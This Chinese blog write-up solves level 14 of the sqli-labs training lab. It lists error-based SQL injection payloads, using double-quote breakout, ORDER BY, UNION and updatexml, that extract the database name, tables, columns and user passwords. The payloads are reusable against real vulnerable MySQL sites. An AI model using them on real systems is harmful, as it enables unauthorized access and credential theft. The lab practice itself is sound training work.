      sqli-labs关卡/sqli-labs第十四关POST报错
      
    </h1>
  

      </header>
      
      <div class="article-info article-info-post">
        
        

        
        <div class="clearfix"></div>
      </div>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">测试报错信息</span><br><span class="line">1&quot;</span><br><span class="line">使用双引号报错，</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435155581.png" alt="1584435155581"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">加上注释符看一下是否回显正确</span><br><span class="line">1&quot;#</span><br><span class="line">没有回显说明正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435205316.png" alt="1584435205316"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看字段数</span><br><span class="line">1&quot; order by 2 #</span><br><span class="line">之前试过3字段错误，2字段没有回显正确</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435309598.png" alt="1584435309598"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">查看注入点</span><br><span class="line">1&quot; union select 1,2 #</span><br><span class="line">没有回显，但是之前出现过错误信息，我们这里使用报错注入试一下</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435358630.png" alt="1584435358630"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">报错注入查看当前数据库名称</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(database()),0x7e),1) #</span><br><span class="line">成功返回当前数据库security</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435491719.png" alt="1584435491719"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">继续使用报错注入查看数据库下的表名</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema&#x3D;&#39;security&#39; limit 0,1),0x7e),1) #</span><br><span class="line">成功返回emails如果要查看其他表更改limit就可以</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435584477.png" alt="1584435584477"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">因为之前查的我们已知有一个users表，查看一下</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_schema&#x3D;&#39;security&#39; and table_name&#x3D;&#39;users&#39; limit 0,1),0x7e),1) #</span><br><span class="line">第一个字段是id</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435675027.png" alt="1584435675027"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">我们已知有username，password表，查看一下password</span><br><span class="line">1&quot; and updatexml(1,concat(0x7e,(select password from users limit 0,1),0x7e),1) #</span><br><span class="line">页面成功返回</span><br></pre></td></tr></table></figure>

<p><img src="/2020/07/25/sqli-labs%E5%85%B3%E5%8D%A1/sqli-labs%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%85%B3POST%E6%8A%A5%E9%94%99/C:%5CUsers%5C%E7%8A%B6%E5%85%83%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5C1584435748617.png" alt="1584435748617"></p>
